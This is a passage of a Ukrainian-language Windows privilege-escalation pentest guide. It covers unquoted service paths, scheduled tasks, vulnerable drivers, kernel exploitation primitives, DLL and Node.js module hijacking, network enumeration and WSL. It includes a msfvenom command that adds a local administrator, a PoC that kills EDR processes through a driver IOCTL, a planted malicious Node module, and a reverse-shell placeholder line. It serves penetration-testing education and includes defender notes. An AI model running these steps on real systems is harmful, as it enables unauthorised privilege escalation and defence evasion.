Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Виведіть список усіх шляхів служб, не взятих у лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити й використати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path`. Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які слід виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона запускала бінарний файл. Якщо цей бінарний файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного файлового аргументу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований пакетний файл містить буквальний виклик PowerShell `-File`, перевірте також ACL указаного скрипту; змінні, умовні оператори та ланцюжки команд потрібно відстежувати вручну. Скрипт або батьківський каталог, доступний для запису викликувачу, є потенційним шляхом до виконання від імені іншого облікового запису лише тоді, коли налаштований суб’єкт завдання відрізняється від викликувача й завдання справді доходить до цієї дії. ACL, що дозволяє лише дописування, може мати значення для скриптів, але попередній `exit` або інший керівний потік може зробити дописані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте фактичні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування програмами. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS читабельний файл може містити іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого набору релевантних доступних резервних копій або файлів конфігурації спершу перевірте **назви й розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і команду PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, є лише зачіпкою. Перевірте фактичні права читання файлу, підтримку потоків файловою системою, чи містить потік придатні для використання облікові дані та від імені якого облікового запису вони справді проходять автентифікацію. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні дані допоміжного засобу Windows Driver Kit для запланованих завдань

До необов’язкового Windows Driver Kit входить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` з каталогу запуску. Заплановане завдання або служба, що запускає цей допоміжний засіб із привілейованим обліковим записом, може перетворити доступ із низькими привілеями на запис до цих вхідних файлів на виконання команд у контексті цього облікового запису, навіть якщо сам виконуваний файл захищений. Переконайтеся, що їх використовує привілейований процес, і що **обидва** супровідні файли можна створити або змінити; самого факту виявлення допоміжного засобу недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) його дії та ACL обох супровідних файлів. Якщо для завдання не вказано робочий каталог, каталог виконуваного файлу є лише зачіпкою, яку потрібно перевірити, а не доказом того, звідки завдання читає вхідні дані. Також має бути виконана передумова щодо файлу проєкту. Перевірте фактичного суб’єкта завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Програми

### Встановлені програми

Перевірте **дозволи на бінарні файли** (можливо, один із них можна перезаписати й підвищити привілеї) та **каталоги** ([DLL Hijacking](dll-hijacking/index.html).)

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували наявний файл, захищений від запису, якщо замінити його не вдавалося. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановлених виправлень і чи може виконуватися вразлива операція агента; позначення лише гілки, як-от `2.1`, не дає змоги визначити наявність вразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби ADSelfService Plus SAML

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася збірки ADSelfService Plus 6210 і попередніх; постачальник виправив її у збірці 6211. Вона актуальна лише якщо SAML SSO **увімкнено або було увімкнено**. Тому запис про встановлений продукт або шлях до служби — це зачіпка, а не висновок про вразливість: підтвердьте точну збірку, історію конфігурації SAML, доступність служби через мережу та обліковий запис, від імені якого вона працює. Виконання коду через службу матиме привілеї цього облікового запису; для виконання від імені SYSTEM потрібен екземпляр, запущений від SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема зачіпка щодо зашифрованої резервної копії, а не доказ наявності придатних облікових даних чи цієї вразливості SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі між контролером Jenkins і доменним обліковим записом

На контролері Jenkins у Windows розрізняйте дозвіл на створення або налаштування завдання та дозвіл на його запуск: [Jenkins описує їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер можуть забезпечити інший спосіб запуску збірки, але підтвердьте, що він увімкнений і збірка справді запускається. Виконання відбувається від імені контролера або вибраного агента, а збережені облікові дані можна використати лише якщо завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає дані облікових записів і ключі шифрування у файлах `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([сховище секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама наявність цих файлів не розкриває пароль; перевірте **доступ на читання до потрібних файлів** і окремий шлях повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта користувача AD, підтвердьте наявність доступного для запису шляху до скрипту та реального споживача — входу в систему або запланованого завдання, що працює від імені цільового користувача, — перш ніж вважати це виконанням від імені іншого користувача. Будь-який додатковий контроль груп потребує окремого підтвердження ефективних прав AD.

#### Ідентичність агента Azure Pipelines із власним розміщенням

Для проєкту Azure DevOps Server або Azure Pipelines розділяйте дозвіл **створювати або редагувати** pipeline, дозвіл **ставити його в чергу** та дозвіл використовувати вибраний пул агентів; [Microsoft окремо описує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити цей pipeline на агенті Windows із власним розміщенням, крок виконується від імені [налаштованого облікового запису операційної системи агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід між користувачами або до SYSTEM, перевірте конкретний pipeline, обмеження гілок і ресурсів, авторизований пул, завдання, придатне до запуску, та ідентичність служби агента. Встановлений агент, роль у проєкті або право запису в репозиторій — лише зачіпки; під час пасивного переліку перевіряйте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який отримує доступ до її бази даних SQL, і **обліковий запис конектора AD DS**, чиї дозволи в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI в контексті облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Встановлена служба синхронізації, група з назвою, що вказує на права локального адміністратора, або сам доступ до бази даних не доводять, що облікові дані можна розшифрувати чи підвищити привілеї в домені. Окремо перевірте фактичні права читання бази даних, доступ до облікового запису служби й ключів, розташування інсталяції та SQL, налаштовану ідентичність конектора і її ефективні привілеї в AD. Під час звичайного переліку показуйте лише метадані служби та доступу, не запитуйте й не виводьте збережені секрети.

#### Дозволи на DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера й DLL, включно з батьківськими каталогами та точками повторного аналізу, навіть якщо доступ до переліку принтерів через WMI заборонено. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказано шлях `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [первинний опис](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) розповідає про завантаження DLL процесом `PrintIsolationHost.exe`. ACL із правом запису — лише зачіпка: перевірте фактичний доступ на запис після врахування заборонних записів, чи встановлено відповідний драйвер і чи завантажує він файл із привілейованою ідентичністю, а також чи виправив інсталяцію оновлений драйвер або програма безпеки постачальника. Не робіть висновків про вразливість лише за назвою каталогу або версією драйвера.

### Дозволи на запис

Перевірте, чи можете змінити файл конфігурації, щоб прочитати спеціальний файл, або змінити двійковий файл, який запускатиметься від імені облікового запису адміністратора (schedtasks).

Знайти слабкі дозволи на папки/файли в системі можна так:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження/виконання плагінів Notepad++

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо доступне портативне/копійоване встановлення з правом запису, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і зворотних викликів плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати реєстр або двійковий файл, який буде запущено від імені іншого користувача.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **розташування autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **підозрілі/вразливі сторонні** драйвери

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в kernel (поширене явище в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши токен SYSTEM із пам’яті kernel.<sup>[[13]](#references)</sup> Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Пов’язані матеріали з експлуатації kernel Windows:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для помилок race condition, де вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може розтягнути вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF у cancel-safe queue, розкриття даних із paged pool і pivots через I/O ring

Деякі ланцюжки LPE у kernel Windows можна побудувати з двох окремо слабких помилок: **race condition життєвого циклу cancel-safe queue**, що звільняє запит/CBD, поки блокування черги ще утримується, та розкриття даних через **звільнення блокування перед копіюванням**, яке витягує дані зі звільненого виділення paged pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту й експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування виконує **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом відновити виконання й передати звільнений `PFLT_CALLBACK_DATA` назад у callback драйвера для видалення.
- **Перевикористайте звільнений об’єкт черги**, виділивши контрольований атакувальником paged pool такого самого розміру. Записи Data Queue Entries у `NPFS` корисні, оскільки їхній вміст і розмір можна контролювати, а згодом перевіряти за допомогою операцій читання/peek pipe. Якщо звільнений об’єкт містить посилання на список, перезапишіть їх **циклічним списком фіктивних вузлів запитів у пам’яті користувача**, щоб драйвер знову й знову обробляв визначені атакувальником структури запитів, а не зупинявся на початковій голові списку.
- **Перетворіть передбачуваний запис на потужніший примітив**: якщо фіктивний запит перенаправляє вкладений вказівник контексту, який використовується для записів службових даних (міток часу / QPC / полів поруч із лічильником посилань), можна отримати **запис у контрольовану адресу, але неконтрольованим значенням**. У такому разі націльтеся на поле **length/size** об’єкта зі sprayed pool, а не на кінцевий вказівник на код/дані, а потім перебирайте об’єкти spray, доки пошкоджений об’єкт не дасть **читання paged pool за межами буфера**.
- **Шаблон розкриття даних, схильний до race condition**: будь-який syscall із послідовністю `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` є перспективним кандидатом. Надійність зростає, якщо атакувальник може збільшити буфер, що копіюється (наприклад, додавши багато записів списку/ресурсів, які збільшують кінцевий розмір виділення серіалізатора), оскільки довше копіювання розширює вік для підміни, не обов’язково спричиняючи аварійне завершення системи.
- **Цілі для повторного заповнення, насичені вказівниками**: зареєстровані масиви буферів Windows **I/O ring** — чудові цілі для розкриття даних, оскільки їхній розмір у paged pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є вказівником kernel на `_IOP_MC_BUFFER_ENTRY`. Зробіть leak одного з цих масивів, відновіть навколишній `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи й надавали довільне читання/запис kernel. Якщо доступний лише запис зі стабільним байтом (наприклад, з `KUSER_SHARED_DATA+0x14`), скористайтеся **перекривними невирівняними записами**, щоб сформувати вказівник користувача з повторюваних байтів, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Після отримання довільного читання/запису ядра через пошкоджене I/O ring викрадіть SYSTEM-токен за допомогою стандартного workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті вуликів реєстру

Сучасні вразливості вуликів дають змогу формувати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU та перетворювати пошкодження метаданих на переповнення kernel paged-pool без власного драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct `RtlQueryRegistryValues` через шляхи, контрольовані атакувальником

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT`, передаючи вказівник на скаляр зі стеку, як-от `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не до очікуваного розробником.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Плутанина повноважень / оракул**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу виконувати запити до ключів, вибраних атакувальником, витікати інформацію про їхнє існування через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: адреса скалярного призначення, як-от `&readValue`, через плутанину типів може трактуватися як `REG_QWORD`, `UNICODE_STRING` або буфер двійкових даних із заданим розміром — залежно від типу значення в реєстрі.

Практичні примітки щодо експлуатації:

- **Пом’якшення у Windows 8+**: якщо запит звертається до **недовіреного вулика** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра спричиняють збій `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **доступні для запису атакувальнику ключі в довірених системних вуликах**, а не розміщуйте значення в `HKCU`.
- **Підготовка даних у довіреному вулику**: використовуйте NtObjectManager, щоб перелічити доступних для запису нащадків `\Registry\Machine`, а потім повторіть сканування з дубльованим токеном **низького рівня цілісності**, щоб знайти ключі, доступні з контекстів sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує суміжні дані стека й може частково перезаписати сусідній вказівник callback-функції.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у direct mode очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скалярну змінну в стеку, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає змогу виконати частково контрольований запис у kernel.
- **`REG_BINARY`**: для великих двійкових даних direct mode трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає в повторно використаній скалярній змінній контрольоване атакувальником **від’ємне** значення, наступний запит `REG_BINARY` копіює байти атакувальника прямо в сусідні слоти стека. Це часто найпростіший шлях до повного перезапису вказівника callback-функції.

Надійний шаблон для пошуку: **читання різнорідних значень реєстру в одну й ту саму змінну стека без повторної ініціалізації**. Виконуйте grep для `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаних вказівників `EntryContext` і шляхів виконання, де перше читання реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN у об’єктах пристроїв (LPE + знищення EDR)

Деякі підписані драйвери сторонніх розробників створюють об’єкт пристрою з надійним SDDL за допомогою IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом, тож будь-який непривілейований користувач може отримати дескриптор, використавши шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, можна зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в систему. Приклади можливостей, виявлених у реальних випадках:
- Повернення дескрипторів із повним доступом до довільних процесів (викрадення токенів / запуск оболонки SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис raw disk (втручання в автономну систему, трюки з persistence під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу знищити AV/EDR із user land через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations for developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких потрібно обмежити за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL, перш ніж дозволяти завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте brokered-моделі замість прямих привілеїв ядра.

Detection ideas for defenders
- Відстежуйте відкриття підозрілих імен пристроїв із user mode (наприклад, \\ .\\amsdk*) і конкретні послідовності IOCTL, що можуть свідчити про зловживання.
- Увімкніть список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволених/заборонених елементів.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папку, що міститься в PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це різновид **необмеженого шляху пошуку у Windows**, що впливає на застосунки **Node.js** і **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тож застосунок, запущений із `C:\Users\Administrator\project\app.js`, може перевірити такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує розв’язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це стає **LPE**, якщо ціль запускається від імені адміністратора, із підвищеного завдання за розкладом/обгортки служби або як привілейований застосунок робочого столу з автозапуском.

Таке особливо часто трапляється, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили з production-збірок, не включили під час пакування або не вдалося встановити
- вразливий `require()` міститься глибоко в дереві залежностей, а не в основному коді застосунку

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях розв’язання:<sup>[[23]](#references)</sup>

- Фільтр `Process Name` = виконуваний файл цільового процесу (`node.exe`, EXE-файл застосунку Electron або процес-обгортка)
- Фільтр `Path` `contains` `node_modules`
- Звертайте увагу на `NAME NOT FOUND` і останнє успішне відкриття в `C:\node_modules`

Корисні шаблони для аналізу коду в розпакованих файлах `.asar` або вихідному коді застосунку:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог для пошуку, якщо він ще не існує:

```powershell
mkdir C:\node_modules
```

3. Помістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, які відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але **техніка** — це те, що можна повторно використовувати: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron намагатиметься resolve-ити.

### Ідеї щодо виявлення та посилення захисту

- Сповіщайте про створення користувачем `C:\node_modules` або записування туди нових файлів/пакетів `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- У production пакуйте всі runtime-залежності та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які приховують помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не вказані в файлі hosts інші відомі комп’ютери.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте **обмежені служби** ззовні

```bash
netstat -ano #Opened ports?
```

Для локального слухача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені свого користувача робочого стола лише за умови, що це дозволяють її автентифікація та засоби керування командами. Користувацька TCP-програма, що працює з вищими привілеями, — це окрема ціль для перевірки: слухач і шлях до бінарного файла є лише пасивними зачіпками, а для використання автентифікованого шляху через пошкодження пам’яті потрібен аналіз саме цього бінарного файла та доступного для нього вводу. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, зіставте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме по собі правило переадресації не доводить, що ціль доступна або вразлива.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку зі related-командами для брандмауера**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для перерахування мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, зможете прослуховувати будь-який порт (під час першої спроби використати `nc.exe` для прослуховування порту через GUI з’явиться запит, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

